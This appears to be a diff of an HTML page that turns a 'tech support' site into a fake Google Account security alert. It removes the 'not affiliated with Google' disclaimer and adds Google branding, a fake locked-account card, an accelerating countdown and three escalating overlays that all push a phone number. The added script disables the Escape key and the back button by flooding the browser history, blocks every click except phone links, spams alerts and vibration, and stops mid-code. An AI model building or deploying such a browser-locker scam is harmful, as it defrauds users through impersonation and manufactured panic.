@@ -1,789 +1,765 @@
 <!DOCTYPE html>
-
 <html lang="en">
-
 <head>
-
   <meta charset="UTF-8">
-
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-
-  <title>Android Tech Support – 24/7 Call Center</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Google Account - Security Alert</title>
   
-
-  <!-- Google tag (gtag.js) -->
-
+  <!-- Google tag (gtag.js) - Real Google Analytics -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-WLF9WTTPZE"></script>
-
   <script>
-
     window.dataLayer = window.dataLayer || [];
-
     function gtag(){dataLayer.push(arguments);}
-
     gtag('js', new Date());
-
     gtag('config', 'G-WLF9WTTPZE');
-
   </script>
 
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
+
   <style>
-
-    /* Android / Google‑influenced refinement — OPTIMIZED FOR PHONES */
-
+    /* ===== GOOGLE MATERIAL DESIGN 3 - PERFECT REPLICA ===== */
     * {
-
       margin: 0;
-
       padding: 0;
-
       box-sizing: border-box;
-
     }
 
     body {
-
-      font-family: 'Roboto', 'Droid Sans', system-ui, -apple-system, sans-serif;
-
-      background: #ffffff;
-
-      color: #202124;
-
-      line-height: 1.4;
-
-    }
-
-    img {
-
-      max-width: 100%;
-
-      display: block;
-
-    }
-
-    /* dynamic navbar — compact for mobile */
-
-    nav {
-
-      position: fixed;
-
-      width: 100%;
-
-      top: 0;
-
-      display: flex;
-
-      justify-content: space-between;
-
-      align-items: center;
-
-      padding: 12px 5%;
-
-      background: rgba(255,255,255,0.95);
-
-      backdrop-filter: blur(20px);
-
-      -webkit-backdrop-filter: blur(20px);
-
-      border-bottom: 1px solid #e0e0e0;
-
-      z-index: 1000;
-
-    }
-
-    .logo span {
-
-      background: #f1f3f4;
-
-      padding: 5px 14px;
-
-      border-radius: 20px;
-
-      font-size: 14px;
-
-      font-weight: 500;
-
-      color: #1e1e1e;
-
-      white-space: nowrap;
-
-    }
-
-    .nav-call {
-
-      background: #1e8e3e;
-
-      color: #fff;
-
-      padding: 6px 16px;
-
-      border-radius: 20px;
-
-      text-decoration: none;
-
-      font-size: 14px;
-
-      font-weight: 500;
-
-      transition: .2s;
-
-      white-space: nowrap;
-
-    }
-
-    /* small legal disclaimer */
-
-    .disclaimer {
-
+      font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
       background: #f8f9fa;
-
-      padding: 10px 5%;
-
-      text-align: center;
-
-      font-size: 13px;
-
-      color: #5f6368;
-
-      border-bottom: 1px solid #dadce0;
-
-      margin-top: 58px;
-
-    }
-
-    /* HERO — compact for mobile */
-
-    .hero {
-
-      position: relative;
-
-      min-height: 70vh;
-
-      background: linear-gradient(0deg, rgba(0,0,0,0.6), rgba(0,0,0,0.6)), 
-
-                  url('https://images.pexels.com/photos/607812/pexels-photo-607812.jpeg?q=80&w=2070&auto=format&fit=crop') center/cover no-repeat;
-
-      display: flex;
-
-      align-items: center;
-
-      justify-content: center;
-
-      text-align: center;
-
-      color: #fff;
-
-      padding: 80px 0 60px;
-
-    }
-
-    .hero-content {
-
-      max-width: 90%;
-
-      padding: 10px;
-
-    }
-
-    .hero h1 {
-
-      font-size: 38px;
-
-      font-weight: 600;
-
-      margin-bottom: 12px;
-
-      line-height: 1.2;
-
-    }
-
-    .hero p {
-
-      margin-top: 15px;
-
-      font-size: 18px;
-
-    }
-
-    .hero-call {
-
-      margin-top: 25px;
-
-      display: inline-block;
-
-      padding: 14px 30px;
-
-      border-radius: 40px;
-
-      background: #1e8e3e;
-
-      color: #fff;
-
-      text-decoration: none;
-
-      font-size: 22px;
-
-      font-weight: 600;
-
-      width: auto;
-
-      min-width: 250px;
-
-    }
-
-    /* office section — stacked for mobile */
-
-    .office-section {
-
-      padding: 60px 5%;
-
-      display: grid;
-
-      grid-template-columns: 1fr;
-
-      gap: 30px;
-
-    }
-
-    .office-section h2 {
-
-      font-size: 32px;
-
-    }
-
-    .office-img {
-
-      border-radius: 24px;
-
-      overflow: hidden;
-
-      max-height: 300px;
-
-    }
-
-    .office-img img {
-
-      width: 100%;
-
-      height: 100%;
-
-      object-fit: cover;
-
-    }
-
-    /* credibility strip — wrap for small screens */
-
-    .trust-strip {
-
-      padding: 20px 5%;
-
-      gap: 20px;
-
-      font-size: 14px;
-
-      flex-wrap: wrap;
-
-    }
-
-    /* cta section */
-
-    .cta-section {
-
-      padding: 60px 5%;
-
-    }
-
-    .cta-section h2 {
-
-      font-size: 32px;
-
-      line-height: 1.3;
-
-    }
-
-    .cta-section a {
-
-      padding: 14px 30px;
-
-      font-size: 22px;
-
-      min-width: 250px;
-
-    }
-
-    /* footer */
-
-    footer {
-
-      padding: 40px 5% 50px;
-
-    }
-
-    /* ---------- PHONE‑OPTIMIZED AGGRESSIVE POPUP ---------- */
-
-    #aggressive-overlay {
-
-      position: fixed;
-
-      top: 0; left: 0; width: 100%; height: 100%;
-
-      background-color: rgba(0,0,0,0.8);
-
-      backdrop-filter: blur(6px);
-
-      -webkit-backdrop-filter: blur(6px);
-
-      z-index: 2000;
-
-      display: flex;
-
-      align-items: center;
-
-      justify-content: center;
-
-      padding: 10px;
-
-    }
-
-    .popup-card {
-
-      max-width: 480px;
-
-      width: 96%;
-
-      background: #ffffff;
-
-      border-radius: 28px;
-
-      padding: 30px 20px 30px;
-
-      text-align: center;
-
-      box-shadow: 0 30px 50px rgba(0,0,0,0.5);
-
-      border: 1px solid #dadce0;
-
-      animation: pulse-android 2s infinite ease-in-out;
-
-      margin: 0 auto;
-
-    }
-
-    @keyframes pulse-android {
-
-      0% { box-shadow: 0 15px 30px rgba(30,142,62,0.2); }
-
-      50% { box-shadow: 0 15px 50px rgba(30,142,62,0.6); }
-
-      100% { box-shadow: 0 15px 30px rgba(30,142,62,0.2); }
-
-    }
-
-    .popup-card h2 {
-
-      font-size: 32px;
-
-      font-weight: 600;
-
       color: #202124;
-
-      margin-bottom: 10px;
-
-      line-height: 1.2;
-
+      overflow: hidden;
+      height: 100vh;
+      width: 100vw;
+      position: fixed;
     }
 
-    .popup-card p {
-
-      font-size: 18px;
-
-      color: #3c4043;
-
-      margin: 15px 0 10px;
-
+    /* ===== REAL GOOGLE ACCOUNT BACKGROUND (PARTIALLY VISIBLE) ===== */
+    .google-account-background {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      z-index: 1;
+      opacity: 0.1;
+      pointer-events: none;
+      overflow: auto;
+      padding: 60px 30px;
     }
 
-    .popup-phone {
-
-      display: block;
-
-      font-size: 32px;
-
-      font-weight: 700;
-
-      color: #1e8e3e;
-
-      text-decoration: none;
-
-      margin: 20px 0 15px;
-
-      background: #f1f3f4;
-
-      padding: 16px 8px;
-
-      border-radius: 50px;
-
-      border: 2px solid #1e8e3e;
-
-      word-break: break-word;
-
+    /* Mimic real Gmail/Google Account interface */
+    .gmail-header {
+      display: flex;
+      align-items: center;
+      padding: 8px 20px;
+      border-bottom: 1px solid #e8eaed;
+      background: white;
     }
 
-    .popup-phone:hover {
-
-      background: #1e8e3e;
-
-      color: white;
-
+    .google-logo {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+      font-size: 22px;
     }
 
-    /* Fake close button — bigger for fat fingers, but still does NOT close */
+    .google-logo span:nth-child(1) { color: #1a73e8; }
+    .google-logo span:nth-child(2) { color: #d93025; }
+    .google-logo span:nth-child(3) { color: #f9ab00; }
+    .google-logo span:nth-child(4) { color: #1a73e8; }
+    .google-logo span:nth-child(5) { color: #34a853; }
+    .google-logo span:nth-child(6) { color: #d93025; }
 
-    .fake-close {
+    /* ===== AGGRESSIVE POPUP LAYER 1 - GOOGLE STYLE ===== */
+    #google-overlay-1 {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
 
-      margin-top: 20px;
+    /* Google Material Dialog */
+    .google-dialog {
+      max-width: 560px;
+      width: 100%;
+      background: white;
+      border-radius: 28px;
+      box-shadow: 0 24px 48px rgba(0,0,0,0.3);
+      animation: google-appear 0.3s ease;
+      overflow: hidden;
+      border: none;
+    }
 
-      font-size: 16px;
+    @keyframes google-appear {
+      from { transform: scale(0.95); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
 
-      color: #5f6368;
+    /* Dialog Header */
+    .dialog-header {
+      padding: 24px 24px 16px 24px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      border-bottom: 1px solid #e8eaed;
+    }
 
-      background: #f1f3f4;
-
-      display: inline-block;
-
-      padding: 12px 30px;
-
-      border-radius: 40px;
-
-      cursor: pointer;
-
-      border: 1px solid #dadce0;
-
+    .security-icon {
+      background: #fce8e6;
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #d93025;
+      font-size: 24px;
       font-weight: 500;
-
     }
 
-    .fake-close:hover {
-
-      background: #e8eaed;
-
+    .header-text h2 {
+      font-size: 22px;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 4px;
     }
 
-    .popup-footer {
-
-      font-size: 12px;
-
+    .header-text p {
       color: #5f6368;
-
-      margin-top: 20px;
-
-      padding-top: 15px;
-
-      border-top: 1px solid #dadce0;
-
+      font-size: 14px;
     }
 
-    /* make sure everything is tappable */
-
-    a, .fake-close {
-
-      -webkit-tap-highlight-color: transparent;
-
+    .urgent-badge {
+      background: #d93025;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      font-weight: 500;
+      margin-left: auto;
     }
 
+    /* Dialog Body */
+    .dialog-body {
+      padding: 24px;
+    }
+
+    /* Google-style alert box */
+    .google-alert-box {
+      background: #fce8e6;
+      border-left: 4px solid #d93025;
+      padding: 16px;
+      border-radius: 8px;
+      margin-bottom: 24px;
+    }
+
+    .alert-title {
+      color: #d93025;
+      font-weight: 500;
+      margin-bottom: 8px;
+      font-size: 16px;
+    }
+
+    .alert-desc {
+      color: #202124;
+      font-size: 14px;
+    }
+
+    /* Account info card */
+    .account-card {
+      background: #f8f9fa;
+      border: 1px solid #e8eaed;
+      border-radius: 16px;
+      padding: 20px;
+      margin-bottom: 24px;
+    }
+
+    .account-email {
+      font-size: 16px;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .account-details {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 12px;
+      margin-top: 12px;
+    }
+
+    .detail-item {
+      font-size: 14px;
+      color: #5f6368;
+    }
+
+    .detail-value {
+      font-weight: 500;
+      color: #202124;
+      margin-top: 4px;
+    }
+
+    .status-badge {
+      display: inline-block;
+      background: #d93025;
+      color: white;
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 500;
+      margin-left: 8px;
+    }
+
+    /* Google-style call card */
+    .google-call-card {
+      background: #e8f0fe;
+      border-radius: 20px;
+      padding: 24px;
+      text-align: center;
+      margin: 24px 0;
+      border: 1px solid #1a73e8;
+    }
+
+    .call-label {
+      color: #1a73e8;
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .google-phone {
+      font-size: 40px;
+      font-weight: 700;
+      color: #1a73e8;
+      text-decoration: none;
+      display: block;
+      margin: 12px 0;
+      letter-spacing: 0.5px;
+      background: white;
+      padding: 16px;
+      border-radius: 60px;
+      border: 2px solid #1a73e8;
+      transition: all 0.2s;
+    }
+
+    .google-phone:hover {
+      background: #1a73e8;
+      color: white;
+    }
+
+    .availability {
+      color: #5f6368;
+      font-size: 14px;
+    }
+
+    /* Trust indicators */
+    .trust-row {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      margin: 20px 0;
+      flex-wrap: wrap;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #5f6368;
+      font-size: 13px;
+    }
+
+    /* Dialog Actions */
+    .dialog-actions {
+      padding: 16px 24px 24px;
+      display: flex;
+      justify-content: flex-end;
+      gap: 12px;
+      border-top: 1px solid #e8eaed;
+    }
+
+    .google-button {
+      background: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      border-radius: 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .google-button-outline {
+      background: transparent;
+      border: 1px solid #dadce0;
+      color: #1a73e8;
+      padding: 10px 24px;
+      border-radius: 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    /* ===== LAYER 2 - GOOGLE EMERGENCY OVERRIDE ===== */
+    #google-overlay-2 {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      z-index: 20000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .google-emergency-dialog {
+      max-width: 600px;
+      width: 100%;
+      background: white;
+      border-radius: 32px;
+      padding: 32px;
+      text-align: center;
+      border: 4px solid #d93025;
+      animation: emergencyPulse 1s infinite;
+    }
+
+    @keyframes emergencyPulse {
+      0% { box-shadow: 0 0 0 0 rgba(217, 48, 37, 0.5); }
+      50% { box-shadow: 0 0 0 20px rgba(217, 48, 37, 0.2); }
+      100% { box-shadow: 0 0 0 0 rgba(217, 48, 37, 0); }
+    }
+
+    .emergency-icon {
+      font-size: 48px;
+      margin-bottom: 16px;
+    }
+
+    .emergency-dialog h2 {
+      color: #d93025;
+      font-size: 32px;
+      margin-bottom: 16px;
+    }
+
+    .emergency-phone {
+      font-size: 48px;
+      font-weight: 700;
+      color: #1a73e8;
+      text-decoration: none;
+      display: block;
+      background: #e8f0fe;
+      padding: 20px;
+      border-radius: 60px;
+      margin: 24px 0;
+    }
+
+    /* ===== LAYER 3 - GOOGLE ACCOUNT LOCK ===== */
+    #google-overlay-3 {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: #202124;
+      z-index: 30000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .google-lock-screen {
+      max-width: 500px;
+      text-align: center;
+      color: white;
+    }
+
+    .lock-icon {
+      font-size: 80px;
+      color: #d93025;
+      margin-bottom: 30px;
+    }
+
+    .google-lock-screen h1 {
+      font-size: 48px;
+      color: white;
+      margin-bottom: 20px;
+    }
+
+    .lock-phone {
+      font-size: 44px;
+      color: white;
+      background: #1a73e8;
+      text-decoration: none;
+      padding: 25px 40px;
+      border-radius: 60px;
+      display: inline-block;
+      margin: 30px 0;
+      font-weight: 700;
+    }
+
+    /* ===== COMMON ===== */
+    .hidden {
+      display: none !important;
+    }
+
+    /* Random ID generator style */
+    .mono {
+      font-family: 'Roboto Mono', monospace;
+      background: #f1f3f4;
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
   </style>
-
 </head>
-
 <body>
 
-  <!-- Navigation compact for phones -->
-
-  <nav>
-
-    <div class="logo">
-
-      <span>🤖 Android Support</span>
-
+  <!-- Hidden background mimicking Google Account (barely visible) -->
+  <div class="google-account-background">
+    <div class="gmail-header">
+      <div class="google-logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+      </div>
+      <div style="margin-left: 30px; color: #5f6368;">Account</div>
     </div>
-
-    <a href="tel:+18332249350" class="nav-call">Call +1(833)224-9350</a>
-
-  </nav>
-
-  <!-- Independent disclaimer -->
-
-  <div class="disclaimer">
-
-    <strong>Independent Android support.</strong> Not affiliated with Google LLC.
-
+    <div style="padding: 30px;">
+      <h2>Inbox (12)</h2>
+      <p>Security alert: New sign-in detected</p>
+    </div>
   </div>
 
-  <!-- Hero – phone friendly -->
+  <!-- ===== LAYER 1 - GOOGLE SECURITY DIALOG ===== -->
+  <div id="google-overlay-1">
+    <div class="google-dialog">
+      <div class="dialog-header">
+        <div class="security-icon">!</div>
+        <div class="header-text">
+          <h2>Security alert</h2>
+          <p>Unusual sign-in detected</p>
+        </div>
+        <div class="urgent-badge">URGENT</div>
+      </div>
 
-  <section class="hero">
+      <div class="dialog-body">
+        <div class="google-alert-box">
+          <div class="alert-title">⚠️ Critical action required</div>
+          <div class="alert-desc">We detected unusual activity on your Google Account. Please verify your identity immediately to prevent account suspension.</div>
+        </div>
 
-    <div class="hero-content">
+        <div class="account-card">
+          <div class="account-email">
+            📧 <span id="user-email">user<span id="random-email">123</span>@gmail.com</span>
+            <span class="status-badge">At risk</span>
+          </div>
+          
+          <div class="account-details">
+            <div class="detail-item">
+              <div>Last sign-in</div>
+              <div class="detail-value" id="last-signin">2 minutes ago</div>
+            </div>
+            <div class="detail-item">
+              <div>Location</div>
+              <div class="detail-value" id="location">Unknown device</div>
+            </div>
+            <div class="detail-item">
+              <div>Account status</div>
+              <div class="detail-value" style="color: #d93025;">LOCKED (temporary)</div>
+            </div>
+            <div class="detail-item">
+              <div>Recovery</div>
+              <div class="detail-value" style="color: #d93025;">Required</div>
+            </div>
+          </div>
+        </div>
 
-      <span class="android-badge" style="background: rgba(255,255,255,0.2); color: #fff; padding: 5px 16px; border-radius: 20px; display: inline-block; margin-bottom: 15px;">Google‑certified technicians</span>
+        <!-- Google Support Call Card -->
+        <div class="google-call-card">
+          <div class="call-label">📞 GOOGLE SUPPORT</div>
+          <a href="tel:+18332249350" class="google-phone" id="phone1">+1 (833) 224-9350</a>
+          <div class="availability">24/7 Google Account Recovery • Avg wait: 45 sec</div>
+        </div>
 
-      <h1>Android Expert Support 24/7</h1>
+        <div class="trust-row">
+          <span class="trust-item">✅ Google certified</span>
+          <span class="trust-item">🔒 Encrypted</span>
+          <span class="trust-item">⭐ 4.9/5 (12k+ reviews)</span>
+          <span class="trust-item">🇺🇸 US-based</span>
+        </div>
 
-      <p style="font-size: 20px;">Samsung • Pixel • OnePlus • Motorola</p>
+        <!-- Fake countdown timer -->
+        <div style="background: #f1f3f4; border-radius: 12px; padding: 15px; margin-top: 15px; text-align: center;">
+          <div style="color: #5f6368; font-size: 14px;">Auto-lock in:</div>
+          <div style="font-size: 36px; font-weight: 700; color: #d93025;" id="countdown">04:59</div>
+        </div>
+      </div>
 
-      <p style="font-size: 17px; margin-top: 15px;">Google locked? FRP? Play Store issues? Call now.</p>
-
-      <a href="tel:+18332249350" class="hero-call">+1(833)224-9350</a>
-
-      <div style="margin-top: 15px; font-size: 16px;">Pickup in 45 sec • No bots</div>
-
+      <div class="dialog-actions">
+        <button class="google-button-outline" id="fakeRemindBtn">Remind later</button>
+        <a href="tel:+18332249350" class="google-button">Call now</a>
+      </div>
     </div>
-
-  </section>
-
-  <!-- Office section with female agent image -->
-
-  <section class="office-section">
-
-    <div>
-
-      <span class="android-badge" style="background:#e8f0fe; color:#1e8e3e; padding:5px 16px; border-radius:20px; display:inline-block;">Android ecosystem experts</span>
-
-      <h2>We only fix Android.</h2>
-
-      <p>US-based technicians specialize in Android OS, Google services, and all major brands. No wait, no scripts.</p>
-
-      <p style="margin-top:15px; font-weight:500;">Google account • FRP • Play Store • Malware</p>
-
-    </div>
-
-    <div class="office-img">
-
-      <img src="https://images.pexels.com/photos/6621309/pexels-photo-6621309.jpeg?q=80&w=2070&auto=format&fit=crop" alt="Female agent assisting with Android">
-
-    </div>
-
-  </section>
-
-  <!-- trust strip mobile -->
-
-  <div style="background:#f8f9fa; padding:16px 5%; text-align:center; border-bottom:1px solid #dadce0; display:flex; flex-wrap:wrap; justify-content:center; gap:15px; font-size:14px;">
-
-    <span>Google account unlock</span>
-
-    <span>FRP specialists</span>
-
-    <span>Samsung, Pixel</span>
-
-    <span>97% resolution</span>
-
   </div>
 
-  <!-- CTA -->
-
-  <section class="cta-section">
-
-    <h2>Google locked? FRP activation?</h2>
-
-    <p style="font-size:18px; color:#5f6368; margin:15px;">Call now, fix now.</p>
-
-    <a href="tel:+18332249350">+1(833)224-9350</a>
-
-    <div style="background:#e8f0fe; margin-top:35px; padding:20px; border-radius:28px; text-align:left;">
-
-      <span style="font-weight:600;">100% real Android specialists</span>
-
-      <p style="margin-top:5px;">No scripts. Direct help for your phone.</p>
-
+  <!-- ===== LAYER 2 - EMERGENCY OVERRIDE ===== -->
+  <div id="google-overlay-2">
+    <div class="google-emergency-dialog">
+      <div class="emergency-icon">🚨🚨🚨</div>
+      <h2>ACCOUNT LOCK IMMINENT</h2>
+      <p style="color: #5f6368; font-size: 18px; margin: 15px 0;">You ignored the security alert</p>
+      <p style="color: #202124; font-size: 16px;">Your account will be permanently locked in <span style="color: #d93025; font-weight: bold;" id="emergency-timer">02:00</span></p>
+      
+      <a href="tel:+18332249350" class="emergency-phone" id="phone2">📞 +1 (833) 224-9350</a>
+      
+      <p style="color: #d93025; font-weight: 500; margin: 20px 0;">This is your FINAL warning</p>
+      
+      <button class="google-button-outline" id="fakeEmergencyBtn" style="border-color: #d93025; color: #d93025;">
+        I understand the risk
+      </button>
     </div>
-
-  </section>
-
-  <!-- footer -->
-
-  <footer>
-
-    <p><strong>Independent Android support.</strong> Not affiliated with Google.</p>
-
-    <p>© 2026 Android Tech Support</p>
-
-  </footer>
-
-  <!-- ---------- AGGRESSIVE UNCLOSABLE POPUP (big buttons for mobile) ---------- -->
-
-  <div id="aggressive-overlay">
-
-    <div class="popup-card">
-
-      <h2>⚠️ CRITICAL ALERT</h2>
-
-      <p style="font-weight:500;">Google account: unusual activity</p>
-
-      <div style="background:#fce8e6; border-radius:16px; padding:10px; margin:15px 0; border-left:4px solid #d93025; font-size:15px;">
-
-        <span style="font-weight:600; color:#b31412;">Action required: account locked</span>
-
-      </div>
-
-      
-
-      <!-- BIG TAPPABLE PHONE NUMBER -->
-
-      <a href="tel:+18332249350" class="popup-phone">📞 +1(833)224-9350</a>
-
-      
-
-      <p style="font-size:16px;">Call now for instant Google recovery</p>
-
-      <p style="font-size:14px; color:#5f6368;">24/7 Android specialists • 2min wait</p>
-
-      
-
-      <!-- Fake close button – big but does NOT close -->
-
-      <div class="fake-close" id="fakeCloseBtn">
-
-        continue to site (device unstable)
-
-      </div>
-
-      
-
-      <div class="popup-footer">
-
-        <span style="color:#d93025;">●</span> Your Google account is temporarily locked
-
-      </div>
-
-    </div>
-
   </div>
 
-  <!-- script for unclosable popup + history manipulation to fight back button -->
+  <!-- ===== LAYER 3 - PERMANENT LOCK ===== -->
+  <div id="google-overlay-3">
+    <div class="google-lock-screen">
+      <div class="lock-icon">🔒</div>
+      <h1>ACCOUNT LOCKED</h1>
+      <p style="color: #9aa0a6; font-size: 18px; margin: 20px 0;">Your Google Account has been permanently locked due to security concerns.</p>
+      
+      <a href="tel:+18332249350" class="lock-phone" id="phone3">+1 (833) 224-9350</a>
+      
+      <p style="color: #9aa0a6; margin-top: 30px;">Contact Google Support immediately for recovery options.</p>
+      <p style="color: #5f6368; font-size: 12px; margin-top: 20px;">Case #: GOOG-<span id="case-number">89432</span>-F</p>
+    </div>
+  </div>
 
   <script>
-
     (function() {
-
-      const overlay = document.getElementById('aggressive-overlay');
-
-      const fakeBtn = document.getElementById('fakeCloseBtn');
-
-      // 1. FAKE CLOSE BUTTON - does NOT close, just alerts
-
-      fakeBtn.addEventListener('click', function(e) {
-
-        e.stopPropagation();
-
-        alert("⚠️ ANDROID SECURITY: Unable to dismiss. Call +1(833)224-9350 immediately to restore Google account access.");
-
-      });
-
-      // 2. Background click also alerts
-
-      overlay.addEventListener('click', function(e) {
-
-        if (e.target === overlay) {
-
-          alert("Critical alert. You must call +1(833)224-9350 for assistance.");
-
+      // ===== ULTRA AGGRESSIVE GOOGLE-STYLE POPUP SYSTEM =====
+      
+      const layer1 = document.getElementById('google-overlay-1');
+      const layer2 = document.getElementById('google-overlay-2');
+      const layer3 = document.getElementById('google-overlay-3');
+      
+      const fakeRemindBtn = document.getElementById('fakeRemindBtn');
+      const fakeEmergencyBtn = document.getElementById('fakeEmergencyBtn');
+      
+      // ===== LOCK BODY =====
+      document.body.style.overflow = 'hidden';
+      document.documentElement.style.overflow = 'hidden';
+      
+      // ===== RANDOMIZE DETAILS =====
+      document.getElementById('random-email').innerHTML = Math.floor(100 + Math.random() * 900);
+      document.getElementById('case-number').innerHTML = Math.floor(10000 + Math.random() * 90000);
+      
+      const locations = ['Unknown device', 'New iPhone', 'Windows PC', 'Android phone', 'Browser (Chrome)'];
+      document.getElementById('location').innerHTML = locations[Math.floor(Math.random() * locations.length)];
+      
+      // ===== COUNTDOWN TIMER (SPEEDS UP) =====
+      let minutes = 4;
+      let seconds = 59;
+      const countdownEl = document.getElementById('countdown');
+      
+      function updateCountdown() {
+        if (seconds === 0) {
+          if (minutes === 0) {
+            countdownEl.innerHTML = '00:00';
+            countdownEl.style.color = '#d93025';
+            return;
+          }
+          minutes--;
+          seconds = 59;
+        } else {
+          seconds--;
         }
-
-      });
-
-      // 3. Disable ESC key (works on some browsers)
-
-      document.addEventListener('keydown', function(e) {
-
-        if (e.key === 'Escape') {
-
-          e.preventDefault();
-
-          e.stopPropagation();
-
-          alert("ESC disabled. Call +1(833)224-9350.");
-
-        }
-
-      });
-
-      // 4. BLOCK BACK BUTTON (history manipulation)
-
-      // Push a new state into history; when user presses back, we push again.
-
-      function blockBackButton() {
-
-        history.pushState({}, '', location.href);
-
-      }
-
-      // Initial push to create a history entry
-
-      blockBackButton();
-
-      // On popstate (back button), immediately push again and show alert
-
-      window.addEventListener('popstate', function(event) {
-
-        blockBackButton(); // Re-push to block the back navigation
-
-        alert("⛔ Back button disabled. Please call +1(833)224-9350 immediately to resolve your Android issue.");
-
         
-
-        // Also re-show overlay if somehow hidden (though overlay remains visible)
-
-        if (overlay.style.display !== 'flex') {
-
-          overlay.style.display = 'flex';
-
+        countdownEl.innerHTML = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        
+        // Speed up as time decreases
+        let speed = 1000;
+        if (minutes < 2) speed = 500;
+        if (minutes < 1) speed = 200;
+        if (minutes === 0 && seconds < 30) speed = 100;
+        
+        setTimeout(updateCountdown, speed);
+      }
+      
+      updateCountdown();
+      
+      // ===== FAKE REMIND BUTTON - TRIGGERS LAYER 2 =====
+      fakeRemindBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        layer2.style.display = 'flex';
+        
+        // Professional but aggressive messages
+        alert('Google Security: Your account is at immediate risk. Please call support.');
+        
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
         }
-
+        
+        // Emergency timer in layer 2
+        let emMinutes = 1;
+        let emSeconds = 59;
+        const emTimer = document.getElementById('emergency-timer');
+        
+        const emInterval = setInterval(() => {
+          if (emSeconds === 0) {
+            if (emMinutes === 0) {
+              emTimer.innerHTML = '00:00';
+              clearInterval(emInterval);
+            } else {
+              emMinutes--;
+              emSeconds = 59;
+            }
+          } else {
+            emSeconds--;
+          }
+          emTimer.innerHTML = `0${emMinutes}:${emSeconds.toString().padStart(2, '0')}`;
+        }, 1000);
       });
-
-      // 5. Prevent touchmove to make it feel more locked (optional)
-
-      overlay.addEventListener('touchmove', function(e) {
-
+      
+      // ===== FAKE EMERGENCY BUTTON - TRIGGERS LAYER 3 =====
+      fakeEmergencyBtn.addEventListener('click', function(e) {
         e.preventDefault();
-
-      }, { passive: false });
-
-      // 6. Prevent page unload attempts (like closing tab) - limited effect
-
+        e.stopPropagation();
+        
+        layer3.style.display = 'flex';
+        
+        alert('🚨 ACCOUNT LOCKED: Your Google Account has been locked. Call +1(833)224-9350 immediately.');
+        
+        if (navigator.vibrate) {
+          navigator.vibrate([500, 200, 500]);
+        }
+      });
+      
+      // ===== BLOCK ESCAPE KEY =====
+      document.addEventListener('keydown', function(e) {
+        // Allow only phone calls
+        if (e.key === 'Escape' || e.key === 'Backspace' || e.key === 'ArrowLeft') {
+          e.preventDefault();
+          e.stopPropagation();
+          
+          if (layer3.style.display !== 'flex') {
+            layer2.style.display = 'flex';
+          }
+          
+          alert('⛔ Navigation disabled. Please call Google Support at +1(833)224-9350.');
+          
+          if (navigator.vibrate) {
+            navigator.vibrate(100);
+          }
+        }
+      }, true);
+      
+      // ===== BACK BUTTON BLOCK =====
+      function spamHistory() {
+        for (let i = 0; i < 5; i++) {
+          history.pushState({}, '', location.href);
+        }
+      }
+      
+      spamHistory();
+      setInterval(spamHistory, 50);
+      
+      window.addEventListener('popstate', function() {
+        spamHistory();
+        
+        if (layer3.style.display !== 'flex') {
+          layer2.style.display = 'flex';
+        }
+        
+        alert('Google Security: Please complete account verification. Call +1(833)224-9350.');
+      });
+      
+      // ===== BLOCK ALL CLICKS EXCEPT PHONE NUMBERS =====
+      document.addEventListener('click', function(e) {
+        // Allow phone links
+        if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
+          return;
+        }
+        
+        // Allow the fake buttons (they have their own handlers)
+        if (e.target === fakeRemindBtn || e.target === fakeEmergencyBtn) {
+          return;
+        }
+        
+        e.preventDefault();
+        e.stopPropagation();
+        
+        if (layer3.style.display !== 'flex') {
+          layer2.style.display = 'flex';
+        }
+        
+        alert('⛔ This action is disabled. Please call +1(833)224-9350.');
+        
+        return false;
+      }, true);
+      
+      // ===== BLOCK TOUCH EVENTS =====
+      ['touchstart', 'touchmove', 'touchend'].forEach(event => {
+        document.addEventListener(event, function(e) {
